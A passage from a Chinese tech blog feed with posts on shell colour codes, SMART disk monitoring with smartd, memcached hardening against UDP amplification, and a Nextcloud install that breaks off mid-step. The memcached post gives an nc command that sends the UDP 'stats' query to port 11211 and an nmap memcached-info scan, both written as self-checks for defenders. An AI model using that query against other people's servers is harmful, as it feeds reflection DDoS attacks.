“\e[1;42;31m绿底红字加粗\e[0m”"></a>echo -e “\e[1;42;31m绿底红字加粗\e[0m”</h1><h1 id="echo-e-“-e-1-42-31-5m绿底红字加粗，且字体闪烁-e-0m”"><a href="#echo-e-“-e-1-42-31-5m绿底红字加粗，且字体闪烁-e-0m”" class="headerlink" title="echo -e “\e[1;42;31;5m绿底红字加粗，且字体闪烁\e[0m”"></a>echo -e “\e[1;42;31;5m绿底红字加粗，且字体闪烁\e[0m”</h1><h1 id="echo-e-“-e-1-42-31-5-4m绿底红字加粗，且字体闪烁、带下划线-e-0m”"><a href="#echo-e-“-e-1-42-31-5-4m绿底红字加粗，且字体闪烁、带下划线-e-0m”" class="headerlink" title="echo -e “\e[1;42;31;5;4m绿底红字加粗，且字体闪烁、带下划线\e[0m”"></a>echo -e “\e[1;42;31;5;4m绿底红字加粗，且字体闪烁、带下划线\e[0m”</h1><pre><code>参考链接: [如何修改PS1命令行提示符的颜色](http://www.madmalls.com/blog/post/how-to-change-the-output-color-of-echo-in-linux/) </code></pre>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>不同企业规模信息安全关注方向</title>
    <link href="/2018/04/28/2018-04-28-different-company-different-security-standard/"/>
    <url>/2018/04/28/2018-04-28-different-company-different-security-standard/</url>
    
    <content type="html"><![CDATA[<h1 id="不同企业规模信息安全关注方向"><a href="#不同企业规模信息安全关注方向" class="headerlink" title="不同企业规模信息安全关注方向"></a>不同企业规模信息安全关注方向</h1><hr><table><thead><tr><th align="center">公司类型</th><th align="center">创业公司</th><th align="center">大中型企业</th><th align="center">特大型互联网企业</th></tr></thead><tbody><tr><td align="center"></td><td align="center">密码策略</td><td align="center">安全专职团队</td><td align="center">自研安全产品</td></tr><tr><td align="center"></td><td align="center">访问控制</td><td align="center">信息安全管理体系</td><td align="center">大数据分析</td></tr><tr><td align="center"></td><td align="center">漏洞管理</td><td align="center">安全架构</td><td align="center">分工细化的多个安全部门</td></tr><tr><td align="center"></td><td align="center">补丁管理</td><td align="center">入侵检测</td><td align="center">业务和风险驱动</td></tr><tr><td align="center"></td><td align="center">防病毒</td><td align="center">漏洞感知</td><td align="center">数据安全</td></tr><tr><td align="center"></td><td align="center">域控</td><td align="center">代码审计&#x2F;SDL</td><td align="center">对外输出</td></tr><tr><td align="center"></td><td align="center">安全加固</td><td align="center">业务连续性</td><td align="center">利润中心</td></tr><tr><td align="center"></td><td align="center">安全编码规范</td><td align="center">业务安全</td><td align="center">CSO角色</td></tr><tr><td align="center"></td><td align="center">众测</td><td align="center">自动化工具</td><td align="center">安全标准</td></tr><tr><td align="center"></td><td align="center">公有云部署</td><td align="center">少量开源产品</td><td align="center">生态</td></tr><tr><td align="center">负责部门</td><td align="center">运维部门(兼职)</td><td align="center">安全部门</td><td align="center">安全事业部</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>List</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>S.M.A.R.T</title>
    <link href="/2018/03/29/2018-03-29-S_M_A_R_T/"/>
    <url>/2018/03/29/2018-03-29-S_M_A_R_T/</url>
    
    <content type="html"><![CDATA[<h1 id="S-M-A-R-T-技术"><a href="#S-M-A-R-T-技术" class="headerlink" title="S.M.A.R.T 技术"></a>S.M.A.R.T 技术</h1><hr><p>S.M.A.R.T.（Self-Monitoring, Analysis and Reporting Technology）意思是自我监控，分析<br>和报告技术，也常常写成SMART。SMART是计算机硬盘驱动器（HDDs）和固态驱动器（SSDs）的监<br>控系统，用来对许多驱动器可靠性的许多指标进行检测和报告，以便能够预测硬件故障。</p><p>当前多数存储设备内建了S.M.A.R.T.附件来监控、存储和分析其设备操作的健康程度。通过软件<br>搜集温度、重新分配的扇区、寻道错误等状态数据，软件可以用来<br>度量设备等健康状况。当S.M.A.R.T.数据预测到驱动器可能的故障，运行在主机上的软件可能会<br>通知用户复制数据到其他驱动器，避免数据丢失以及可以替换驱动<br>器。</p><h2 id="smartmontools"><a href="#smartmontools" class="headerlink" title="smartmontools"></a>smartmontools</h2><p>smartmontools软件包包含了2个工具程序来分析和监控存储设备：smartctl和smartd。</p><p>设备必须支持SMART功能并且激活每个存储设备的SMART，这样才能有效使用工具。可以使用<br><code>smartctl</code>来检查是否激活了SMART支持，然后运行测试和检查测试结果。<br>另外，可以使用smartd在自动运行测试和进行email通知。</p><h2 id="安装smartmontools"><a href="#安装smartmontools" class="headerlink" title="安装smartmontools"></a>安装smartmontools</h2><ul><li><p>Debian</p><p>  <code>apt-get install smartmontools</code></p></li><li><p>CentOS&#x2F;RHEL</p><p>  <code>yum install smartmontools</code></p></li></ul><h2 id="smartctl"><a href="#smartctl" class="headerlink" title="smartctl"></a>smartctl</h2><p><code>smartctl</code>是一个命令行工具,控制大多数ATA&#x2F;SATA和SCSI&#x2F;SAS硬盘和固态存储内建的SMART”。</p><p><code>--info</code>或<code>-i</code>参数将打印一个设备的信息参数，包括是否支持SMART以及是否激活了该功能。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">smartctl -i <span class="hljs-regexp">/dev/</span>sda<br></code></pre></td></tr></table></figure><p>显示输出（包括了型号、序列号、Firmware版本、容量、扇区、接口等信息，最后两行参数显<br>示支持SMART）</p><pre><code>=== START OF INFORMATION SECTION ===Model Family:     Seagate Laptop HDDDevice Model:     ST500LT012-1DG142Serial Number:    W3P13ZF9LU WWN Device Id: 5 000c50 06e3a8813Firmware Version: 0002LVM1User Capacity:    500,107,862,016 bytes [500 GB]Sector Sizes:     512 bytes logical, 4096 bytes physicalRotation Rate:    5400 rpmForm Factor:      2.5 inchesDevice is:        In smartctl database [for details use: -P show]ATA Version is:   ATA8-ACS T13/1699-D revision 4SATA Version is:  SATA 3.0, 6.0 Gb/s (current: 3.0 Gb/s)Local Time is:    Thu Mar 29 16:22:02 2018 CSTSMART support is: Available - device has SMART capability.SMART support is: Enabled</code></pre><p>如果设备没有激活SMART，可以使用命令</p><pre><code>smartctl --smart=on /dev/sda</code></pre><p>有可能需要指定设备类型，如 <code>--device=ata</code> 以便通知smartctl设备类型，避免使用SCSI命令<br><code>--smart=off</code>可关闭设备的SMART功能</p><h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>有3种类型的自我测试（所有的测试都是用户数据安全的）：</p><blockquote><ul><li>short (检查设备的高概率问题)</li><li>extended （或者称为long测试，将进行完整的磁盘表面快速检查）</li><li>conveyance （在设备的传输过程中标示是否存在损坏）</li></ul></blockquote><p><code>-c</code>参数（或者<code>--capabilities</code>）输出设备支持的测试以及每个测试需要花费的时间</p><pre><code>smartctl -c /dev/sda</code></pre><p>运行结果：</p><pre><code>=== START OF READ SMART DATA SECTION ===General SMART Values:Offline data collection status:  (0x00)    Offline data collection activity                    was never started.                    Auto Offline Data Collection: Disabled.Self-test execution status:      (   0)The previous self-test routine completed    without error or no self-test has ever         been run.Total time to complete Offline data collection: (    0) seconds.Offline data collectioncapabilities:  (0x73) SMART execute Offline immediate.    Auto Offline data collection on/off support.        Suspend Offline collection upon new            command.                No Offline surface scan supported.                    Self-test supported.                    Conveyance Self-test supported.                    Selective Self-test supported.SMART capabilities:            (0x0003)Saves SMART data before entering                    power-saving mode.                    Supports SMART auto save timer.Error logging capability:        (0x01)Error logging supported.                    General Purpose Logging supported.Short self-test routine recommended polling time:  (   1) minutes.Extended self-test routinerecommended polling time:  ( 103) minutes.Conveyance self-test routinerecommended polling time:  (   2) minutes.SCT capabilities:        (0x1031)SCT Status supported.                    SCT Feature Control supported.                    SCT Data Table supported.</code></pre><p>使用<code>-t</code>(或者<code>--test=&lt;test_name&gt;</code>)参数来运行一个测试</p><pre><code>smartctl -t short /dev/&lt;device&gt;smartctl -t long /dev/&lt;device&gt;smartctl -t conveyance /dev/&lt;device&gt;</code></pre><h2 id="查看测试结果"><a href="#查看测试结果" class="headerlink" title="查看测试结果"></a>查看测试结果</h2><p>可以使用<code>-H</code>参数来查看设备的健康概况。 “如果设备报告<code>failing health</code>状态，就意味着设备<br>已经故障，或者设备预测自己将在24小时内故障。这种情况下要尽可能快地将设备上的数据导出<br>到安全的存储中”</p><pre><code>smartctl -H /dev/&lt;device&gt;  </code></pre><p>可以列出最近的测试结果以及设备的详细信息</p><pre><code>smartctl -l selftest /dev/&lt;device&gt;smartctl -a /dev/&lt;device&gt;</code></pre><h2 id="快速测试案例"><a href="#快速测试案例" class="headerlink" title="快速测试案例"></a>快速测试案例</h2><p>启动一个短暂的自测试</p><pre><code>sudo smartctl -t short /dev/sda</code></pre><p>如果要中断测试（没有必要的话不要自行中断命令）</p><pre><code>smartctl -X</code></pre><p>短暂自测试大约2分钟，然后用下面的命令查看测试结果</p><pre><code>sudo smartctl -l selftest /dev/sda</code></pre><p>显示结果类似</p><p>直接查看磁盘的健康状况</p><pre><code>smartctl --health /dev/sda</code></pre><p>显示</p><pre><code>=== START OF READ SMART DATA SECTION ===SMART Health Status: OK</code></pre><p>输出详细的设备信息</p><pre><code>smartctl -a /dev/sda</code></pre><p>输出结果类似</p><h2 id="smartd"><a href="#smartd" class="headerlink" title="smartd"></a>smartd</h2><p><code>smartd</code> daemon监控SMART状态，并在发生问题时邮件通知。这个服务可以通过systemd管理，<br>并且使用<code>/etc/smartd.conf</code>配置文件。不过这个配置文件非常晦涩难懂，详细配置可以参<br>考<code>man 5 smartd.conf</code>或者<a href="https://www.smartmontools.org/browser/trunk/smartmontools/smartd.conf.5.in">smartd.conf info</a></p><h2 id="管理smartd服务"><a href="#管理smartd服务" class="headerlink" title="管理smartd服务"></a>管理smartd服务</h2><p>启动、检查状态、以及激活自启动和查看最近的日志</p><pre><code>systemctl start smartdsystemctl status smartdsystemctl enable smartdjournalctl -u smartd</code></pre><h2 id="定义监控的设备"><a href="#定义监控的设备" class="headerlink" title="定义监控的设备"></a>定义监控的设备</h2><p>要监控所有可能SMART错误，则配置<code>/etc/smartd.conf</code>（在CentOS 7是<code>/etc/smartmontools/smartd.conf</code>）</p><pre><code>DEVICESCAN -a</code></pre><p>如果要只监控指定的磁盘，例如</p><pre><code>/dev/sda -a/dev/sdb -a</code></pre><p>也可以对外接的磁盘（如通过USB连接的备份用磁盘），需要通知SMARTd设备的UUID，这是因为每次<br>重启设备的<code>/dev/sdX</code>可能变化</p><p>要获取需要监控的磁盘的UUID，可以使用<code>ls -lah /dev/disk/by-uuid/</code> 来查看需要监控的磁盘。<br>以下配置在smartd.conf中的配置就是针对USB磁盘</p><pre><code>/dev/disk/by-uuid/820cdd8a-866a-444d-833c-1edb0f4becac -a</code></pre><h2 id="使用电子邮件通知潜在的问题"><a href="#使用电子邮件通知潜在的问题" class="headerlink" title="使用电子邮件通知潜在的问题"></a>使用电子邮件通知潜在的问题</h2><p>要在故障或新的错误发生时通知，使用<code>-m</code>参数</p><pre><code>DEVICESCAN -m address@domain.com</code></pre><p>要发送给外部的email地址，需要确保系统有MTA(Mail Transport Agent)或者MUA(Mail User Agent)<br>并且已经正确配置。通常MTU是sendmail和Postfix。</p><p>如果设置了<code>-M test</code>就会在smartd服务启动时发送一个测试邮件</p><pre><code>DEVICESCAN -m address@domain.com -M test</code></pre><p>由于电子邮件投递需要很长时间，而通常期望硬盘故障时立即被通知到以便采取措施。则可以定义<br>执行一个脚本来替代email</p><pre><code>DEVICESCAN -m address@domain.com -M exec /usr/local/bin/smartdnotify</code></pre><p>CentOS默认配置</p><p>检查了CentOS 7默认配置的<code>/etc/smartmontools/smartd.conf</code>，配置内容实际只有一行</p><pre><code>DEVICESCAN -H -m root -M exec /usr/libexec/smartmontools/smartdnotify -n standby,10,q</code></pre><p>这里通知是发送给系统的root用户，并且执行了脚本<code>/usr/libexec/smartmontools/smartdnotify</code> 这<br>个脚本实现了email通知，同时将消息写到终端上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/sh</span><br><br><span class="hljs-comment"># Send mail</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$SMARTD_MESSAGE</span>&quot;</span> | mail -s <span class="hljs-string">&quot;<span class="hljs-variable">$SMARTD_FAILTYPE</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$SMARTD_ADDRESS</span>&quot;</span><br><br><span class="hljs-comment"># Notify desktop user</span><br>MESSAGE=<span class="hljs-string">&quot;WARNING: Your hard drive is failing&quot;</span><br><br><span class="hljs-comment"># direct write to terminals, do not use &#x27;wall&#x27;, because we don&#x27;t want its ugly header</span><br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">who</span> | awk <span class="hljs-string">&#x27;&#123; print $2; &#125;&#x27;</span> | grep -e <span class="hljs-string">&#x27;^tty&#x27;</span> -e <span class="hljs-string">&#x27;^pts/&#x27;</span>)<br><span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$MESSAGE</span></span><br><span class="hljs-string"><span class="hljs-variable">$SMARTD_MESSAGE</span>&quot;</span> &gt;/dev/<span class="hljs-variable">$t</span> 2&gt;/dev/null ||:<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h2 id="电源管理"><a href="#电源管理" class="headerlink" title="电源管理"></a>电源管理</h2><p>可以用smartd来处理磁盘的低电压模式，这样可以通过smartd来响应SMART命令，磁盘转速。没<br>有这个参数，磁盘可能在低电压情况下仍然高速旋转：</p><pre><code>DEVICESCAN -n standby,15,q</code></pre><blockquote><p>详细参考 <a href="http://www.smartmontools.org/wiki/Powermode">smartmontools wiki</a></p></blockquote><h2 id="周期自测"><a href="#周期自测" class="headerlink" title="周期自测"></a>周期自测</h2><p>smartd可以告诉磁盘定期执行自检，以下配置设置磁盘每天早上2-3点进行short self-test，在<br>每个周六的早上3-4点进行详细自测</p><pre><code>DEVICESCAN -s (S/../.././02|L/../../6/03)</code></pre><h2 id="温度改变时告警"><a href="#温度改变时告警" class="headerlink" title="温度改变时告警"></a>温度改变时告警</h2><p>smartd可以跟踪磁盘问题并且在磁盘温度太快升高或者达到阀值时高进。以下配置在发生4度温度变化，或者温度达到35度，进行日志，在温度达到40度时日志和邮件告警</p><pre><code>DEVICESCAN -W 4,35,40</code></pre><p>可以使用命令检查当前磁盘温度<code>smartctl -A /dev/&lt;device&gt; | grep Temperature_Celsius</code></p><h2 id="完整的smartd-conf配置"><a href="#完整的smartd-conf配置" class="headerlink" title="完整的smartd.conf配置"></a>完整的smartd.conf配置</h2><p>以下配置将上述所有配置集成</p><p>DEVICESCAN (smartd scans for disks and monitors all it finds)</p><pre><code>-a (monitor all attributes)-o on (enable automatic online data collection)-S on (enable automatic attribute autosave)-n standby,q (do not check if disk is in standby, and suppress log message to that effect so as not to cause a write to disk)-s ... (schedule short and long self-tests)-W ... (monitor temperature)-m ... (mail alerts)</code></pre><p>配置如下</p><pre><code>DEVICESCAN -a -o on -S on -n standby,q -s (S/../.././02|L/../../6/03) -W 4,35,40 -m &lt;username or email&gt;</code></pre><p>这个配置非常完善，可参考</p><h2 id="GSmartControl图形管理工具"><a href="#GSmartControl图形管理工具" class="headerlink" title="GSmartControl图形管理工具"></a>GSmartControl图形管理工具</h2><p><strong>GSmartControl</strong>是smartctl的的图形前端，显示所有的SMART数值，并且高亮显示那些旧值或者<br>即将故障，可以按照需要运行测试</p><pre><code>GSmartControl main window</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><pre><code>[Wikipedia: S.M.A.R.T.](https://en.wikipedia.org/wiki/S.M.A.R.T.)[archlinux: S.M.A.R.T. ](https://wiki.archlinux.org/index.php/S.M.A.R.T.)- 本文主要参考[Monitoring Hard Disks with SMART](http://www.linuxjournal.com/magazine/monitoring-hard-disks-smart)[Get the disk health status with SMART monitor tools on Debian and Ubuntu Linux](http://www.linuxjournal.com/magazine/monitoring-hard-disks-smart)[Using smartctl to get SMART status information on your hard drives](http://www.techrepublic.com/blog/linux-and-open-source/using-smartctl-to-get-smart-status-information-on-your-hard-drives/)[ubuntu: Smartmontools](https://help.ubuntu.com/community/Smartmontools) - 本文主要参考，提供了监控个人电脑和服务器的脚本以及处理经验[SMART tests with smartctl](https://www.thomas-krenn.com/en/wiki/SMART_tests_with_smartctl)[Monitoring Hard Drive Health on Linux with smartmontools](https://blog.shadypixel.com/monitoring-hard-drive-health-on-linux-with-smartmontools/)</code></pre><p><strong>文章参考</strong><br><a href="https://huataihuang.gitbooks.io/cloud-atlas/content/storage/das/smart.html">https://huataihuang.gitbooks.io/cloud-atlas/content/storage/das/smart.html</a></p><p><strong>文章参考</strong><br><a href="https://huataihuang.gitbooks.io/cloud-atlas/content/storage/das/smart.html">https://huataihuang.gitbooks.io/cloud-atlas/content/storage/das/smart.html</a></p>]]></content>
    
    
    <categories>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>i/o</tag>
      
      <tag>disk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>memcached 安全加固</title>
    <link href="/2018/03/02/2018-03-02-memcaced-security-reinforcement/"/>
    <url>/2018/03/02/2018-03-02-memcaced-security-reinforcement/</url>
    
    <content type="html"><![CDATA[<h1 id="Memcached安全加固"><a href="#Memcached安全加固" class="headerlink" title="Memcached安全加固"></a>Memcached安全加固</h1><hr><h2 id="Memcached用户"><a href="#Memcached用户" class="headerlink" title="Memcached用户"></a>Memcached用户</h2><p>如果您正在使用memcached，请在不使用UDP的情况下禁用UDP。在memcached启动时，您可以指定<code>--listen 127.0.0.1</code>仅侦听本地主机并<code>-U 0</code>完全禁用UDP。默认情况下，memcached侦听<strong>INADDR_ANY</strong>，并在UDP支持ENABLED的情况下运行。文档：<br><a href="https://github.com/memcached/memcached/wiki/ConfiguringServer#udp">https://github.com/memcached/memcached/wiki/ConfiguringServer#udp</a><br>运行以下命令可以轻松测试服务器是否易受攻击：</p><pre><code>$ echo -en &quot;\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n&quot; | nc -q1 -u 127.0.0.1 11211STAT pid 21357STAT uptime 41557034STAT time 1519734962...</code></pre><p>如果您看到非空的响应（如上所示），则您的服务器很脆弱。</p><h2 id="系统管理员"><a href="#系统管理员" class="headerlink" title="系统管理员"></a>系统管理员</h2><p>请确保您的memcached服务器从互联网受到防火墙限制！为了测试它们是否可以使用UDP访问，运行nmap来检测：</p><pre><code>$ nmap TARGET -p 11211 -sU -sS --script memcached-infoStarting Nmap 7.30 ( https://nmap.org ) at 2018-02-27 12:44 UTCNmap scan report for xxxxHost is up (0.011s latency).PORT      STATE         SERVICE11211/tcp open          memcache| memcached-info:|   Process ID           21357|   Uptime               41557524 seconds|   Server time          2018-02-27T12:44:12|   Architecture         64 bit|   Used CPU (user)      36235.480390|   Used CPU (system)    285883.194512|   Current connections  11|   Total connections    107986559|   Maximum connections  1024|   TCP Port             11211|   UDP Port             11211|_  Authentication       no11211/udp open|filtered memcache</code></pre><h2 id="互联网服务提供商"><a href="#互联网服务提供商" class="headerlink" title="互联网服务提供商"></a>互联网服务提供商</h2><p><strong>分布式缓存反射器</strong><br>为了在未来击败此类攻击，我们需要修复易受攻击的协议以及IP欺骗。只要互联网上允许IP欺骗，我们就会陷入困境。<br>通过跟踪这些攻击背后的人来帮助我们。我们必须知道谁不是有问题的memcached服务器，而是首先向他们发送查询的人。没有你的帮助，我们无法做到这一点！</p><h2 id="开发商"><a href="#开发商" class="headerlink" title="开发商"></a>开发商</h2><p>请停止使用UDP。如果您必须，请不要默认启用它。如果你不知道什么是放大攻击，我特此禁止你<strong>SOCK_DGRAM</strong>在编辑器中输入内容。<br>我们已经遇到过这么多次了。DNS，NTP，Chargen，SSDP和现在的memcached。如果使用UDP，则必须始终以严格较小的数据包大小响应请求。否则你的协议将被滥用。另外请记住，人们会忘记设置防火墙。做一个开发人员。不要发明缺乏任何类型认证的基于UDP的协议。</p><h2 id="加固方式总结"><a href="#加固方式总结" class="headerlink" title="加固方式总结"></a>加固方式总结</h2><h3 id="配置访问控制。"><a href="#配置访问控制。" class="headerlink" title="配置访问控制。"></a>配置访问控制。</h3><p>建议用户不要将服务发布到互联网上而被黑客利用，可以通过ECS安全组规则或IPtables配置访问控制规则。<br>例如，在Linux环境中运行命令<code>iptables -A INPUT -p tcp -s 192.168.0.2 —dport 11211 -j ACCEPT</code>，在IPtables中添加此规则只允许192.168.0.2这个IP对11211端口进行访问。</p><h3 id="绑定监听IP。"><a href="#绑定监听IP。" class="headerlink" title="绑定监听IP。"></a>绑定监听IP。</h3><p>如果Memcached没有在公网开放的必要，可在Memcached启动时指定绑定的IP地址为 127.0.0.1。例如，在Linux环境中运行以下命令：</p><pre><code>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</code></pre><h3 id="最小化权限运行。"><a href="#最小化权限运行。" class="headerlink" title="最小化权限运行。"></a>最小化权限运行。</h3><p>使用普通权限账号运行，指定Memcached用户。例如，在Linux环境中运行以下命令来运行Memcached：</p><pre><code>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</code></pre><h3 id="修改默认端口。"><a href="#修改默认端口。" class="headerlink" title="修改默认端口。"></a>修改默认端口。</h3><p>修改默认11211监听端口为11222端口。在Linux环境中运行以下命令：</p><pre><code>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid</code></pre><p>Memcached命令参数说明</p><pre><code>-d 是指启动一个守护进程。-m 是指分配给Memcached使用的内存数量，单位是MB，以上为1024MB。-u 是指运行Memcached的用户，推荐使用单独普通权限用户memcached，而不要使用root权限账户。-l 是指监听的服务器IP地址，例如指定服务器的IP地址为127.0.0.1。-p 是用来设置Memcached的监听端口，默认端口为11211。建议设置1024以上的端口。-c 是指最大运行的并发连接数，默认是1024。可按照您服务器的负载量来设定。-P 是指设置保存Memcached的pid文件，例如保存在 /tmp/memcached.pid 位置。</code></pre><p><strong>文章参考</strong><br><a href="https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/">https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Memcached</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu server 安装nextcloud12</title>
    <link href="/2018/02/21/2018-02-21-install-nextcloud12-on-ubuntu/"/>
    <url>/2018/02/21/2018-02-21-install-nextcloud12-on-ubuntu/</url>
    
    <content type="html"><![CDATA[<h1 id="ubuntu-server-安装nextcloud12"><a href="#ubuntu-server-安装nextcloud12" class="headerlink" title="ubuntu server 安装nextcloud12"></a>ubuntu server 安装nextcloud12</h1><hr><h2 id="1-更新系统安装必要的依赖包"><a href="#1-更新系统安装必要的依赖包" class="headerlink" title="1.更新系统安装必要的依赖包"></a>1.更新系统安装必要的依赖包</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[user]$ sudo apt-<span class="hljs-built_in">get</span> update &amp;&amp; sudo apt-<span class="hljs-built_in">get</span> -y<span class="hljs-built_in"> upgrade</span><br><span class="hljs-built_in"></span>[user]$ sudo apt-<span class="hljs-built_in">get</span> install software-properties-common nano wget<br></code></pre></td></tr></table></figure><h2 id="2-安装MariaDB10以上版本，如果不清楚安装的版本是否符合nextcloud要求，可以到官网上查询"><a href="#2-安装MariaDB10以上版本，如果不清楚安装的版本是否符合nextcloud要求，可以到官网上查询" class="headerlink" title="2.安装ＭariaDB10以上版本，如果不清楚安装的版本是否符合nextcloud要求，可以到官网上查询"></a>2.安装ＭariaDB10以上版本，如果不清楚安装的版本是否符合nextcloud要求，可以到官网上查询</h2><p>nextcloud官网：<a href="https://nextcloud.com/install/#">https://nextcloud.com/install/#</a><br>MariaDB安装与配置:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[<span class="hljs-keyword">user</span>]$ sudo apt-<span class="hljs-keyword">get</span> install -y mariadb-<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p>安装完毕以后，运行：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[user]</span>$ mysql_secure_installation<br></code></pre></td></tr></table></figure><p>这个的主要目的是更新和配置数据库，同时设置相应的root密码，我在安装的时候遇到一个问题就是在普通用户下无法成功连接到数据库，需要切换到root进行，目前没有解决这个问题，如果哪位大佬可以解决，请给我留言．<br>重启ＭariaDB服务：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[<span class="hljs-keyword">user</span>]$ sudo service mysql <span class="hljs-keyword">restart</span><br></code></pre></td></tr></table></figure><p>登录数据库并且创建相应的数据库</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[user]</span>$ mysql -uroot -p<br></code></pre></td></tr></table></figure><p>***注意这一步如果登录失败，请切换root用户执行<br>创建数据库：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">MariaDB [(<span class="hljs-keyword">none</span>)]&gt; <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> nextcloud;<br>MariaDB [(<span class="hljs-keyword">none</span>)]&gt; <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> nextcloud.* <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;nextcloud&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;strong_password&#x27;</span>;<br>MariaDB [(<span class="hljs-keyword">none</span>)]&gt; FLUSH <span class="hljs-keyword">PRIVILEGES</span>;<br>MariaDB [(<span class="hljs-keyword">none</span>)]&gt; \q<br></code></pre></td></tr></table></figure><h2 id="3-安装php"><a href="#3-安装php" class="headerlink" title="3.安装php"></a>3.安装php</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[<span class="hljs-keyword">user</span>]$ sudo apt-<span class="hljs-keyword">get</span> -y install php-fpm php-cli php-<span class="hljs-type">json</span> php-curl php-imap php-gd php-mysql php-<span class="hljs-type">xml</span> php-zip php-intl php-mcrypt php-imagick php-mbstring<br></code></pre></td></tr></table></figure><p>这里设置的<strong>php memory</strong>为512MB，<strong>upload_max_filesize</strong> 和 <strong>post_max_size</strong> 为200MB</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash">sed -i <span class="hljs-string">&quot;s/memory_limit = .*/memory_limit = 512M/&quot;</span> /etc/php/7.0/fpm/php.ini</span><br><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash">sed -i <span class="hljs-string">&quot;s/;date.timezone.*/date.timezone = UTC/&quot;</span> /etc/php/7.0/fpm/php.ini</span><br><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash">sed -i <span class="hljs-string">&quot;s/;cgi.fix_pathinfo=1/cgi.fix_pathinfo=1/&quot;</span> /etc/php/7.0/fpm/php.ini</span><br><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash">sed -i <span class="hljs-string">&quot;s/upload_max_filesize = .*/upload_max_filesize = 200M/&quot;</span> /etc/php/7.0/fpm/php.ini</span><br><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash">sed -i <span class="hljs-string">&quot;s/post_max_size = .*/post_max_size = 200M/&quot;</span> /etc/php/7.0/fpm/php.ini</span><br></code></pre></td></tr></table></figure><p>*<strong>配置文件的位置</strong>：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">php:</span><span class="hljs-keyword">/etc/</span>php/<span class="hljs-number">7.0</span><span class="hljs-keyword">/fpm/</span>php.ini<br></code></pre></td></tr></table></figure><p>配置<strong>PHP-FPM</strong><br>配置文件使用默认的就好，如果有问题，请参考下面关于环境变量的配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> vim /etc/php/7.0/fpm/pool.d/www.conf</span><br></code></pre></td></tr></table></figure><p><strong>环境变量</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 